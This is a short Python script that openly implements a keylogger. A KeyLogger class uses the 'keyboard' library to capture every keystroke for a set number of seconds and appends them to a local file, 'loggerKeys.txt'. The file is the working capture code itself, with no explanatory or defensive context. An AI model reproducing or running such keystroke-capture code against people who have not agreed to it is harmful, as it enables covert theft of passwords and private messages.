import keyboard
import time

class KeyLogger(object):

    def track(self,finish_time,file_name):
        curr_time = time.time()

        while (time.time() - curr_time) <= finish_time:
            self._write_on_file(file_name,keyboard.read_key())

    def _write_on_file(self,file_name,key):
         f = open(file_name,'a')
         f.write(key+' ')
         f.close()

logger = KeyLogger()
logger.track(finish_time=5,file_name="loggerKeys.txt")